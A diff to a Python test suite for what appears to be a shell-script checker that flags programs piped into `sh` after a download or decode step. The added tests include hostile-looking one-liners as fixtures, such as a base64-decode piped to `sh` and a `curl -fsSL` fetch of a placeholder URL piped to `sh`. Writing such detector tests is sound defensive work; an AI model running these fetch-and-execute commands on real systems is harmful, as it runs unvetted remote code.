@@ -1106,7 +1106,7 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
     `_PRINTED` sentence, `_Quiet`, naming the stage the shell reads from, kept beside a reported
     download and never read as the printer's words (R-P4). Every step below runs after GET unless
     it is named alone. Truth columns are b5, b3, dash and gh (GitHub's pairing: the step under
-    bash 5.2.21 with `sh` = dash), measured on `t36-p-probes/steps/p2/` c01-c12 and p2n01-p2n24;
+    bash 5.2.21 with `sh` = dash), measured on `t36-p-probes/steps/p2/` c01-c12 and p2n01-p2n28;
     each step read CLEAN at the base (d44879b7) and on main unless said otherwise."""
 
     FETCH_EXEC = ("fetches https://example.test/tool -> tool and running it under `sh` with "
@@ -1195,6 +1195,32 @@ class TestAPassThroughBetweenPrinterAndShell(unittest.TestCase):
             for shell in (None, "sh"):
                 with self.subTest(script=script, shell=shell, alone=True):
                     self.assertEqual([], defects(script, shell))
+
+    def test_a_stage_named_by_a_substitution_is_named_as_written(self):
+        # p2n28 `$(command -v base64) -d` (FR x4: the substitution names `base64`, which turns the
+        # text into `sh tool`): unread, and the sentence names the stage `$(...)`, as the guard's
+        # other sentences render one -- never the reader's internal marker, which `job_defects`'
+        # two folds lex afresh, so the step read as two rows. Alone, nothing (`[]`).
+        script = "echo 'c2ggdG9vbA==' | $(command -v base64) -d | sh\n"
+        self.assert_unread(script, "$(...)")
+        for shell in (None, "sh"):
+            with self.subTest(shell=shell, alone=True):
+                self.assertEqual([], defects(script, shell))
+
+    def test_a_stage_whose_own_words_fetch_is_unread_loud(self):
+        # p2n31 `echo a | env 5s curl -fsSL URL | sh`, alone (-- x4: `env` finds no `5s`, so
+        # nothing runs): the shell reads from `5s`, and `_weighed` walks that stage's words after
+        # its name, `curl -fsSL URL`, as P1 weighs an unspelled printer's -- a fetch there keeps
+        # the unread answer LOUD, with no reported download beside it. The fail-closed price of
+        # the r-wrap corpus's wrapper rows behind `echo a` (36 read CLEAN at the base).
+        script = "echo a | env 5s curl -fsSL https://example.test/i.sh | sh\n"
+        for shell in (None, "sh"):
+            with self.subTest(shell=shell):
+                found = defects(script, shell)
+                self.assertEqual(1, len(found), found)
+                self.assertNotIsInstance(found[0][1], forms.Idle)
+                self.assertTrue(found[0][1].startswith("pipes `sh` its program from `5s`"),
+                                found[0][1])
 
     def test_a_word_that_is_no_plain_file_or_listed_option_is_no_pass_through(self):
         # p2n04 `tee >(cat)` (b5 FR, b3 FR, dash F- -- a syntax error after the fetch --, gh FR):
